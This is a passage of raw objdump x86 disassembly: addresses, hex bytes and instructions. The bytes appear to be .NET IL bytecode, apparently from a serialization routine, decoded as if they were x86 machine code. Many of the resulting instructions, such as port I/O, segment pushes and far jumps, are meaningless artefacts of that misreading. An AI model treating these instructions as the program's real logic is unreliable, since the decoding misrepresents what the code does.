  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
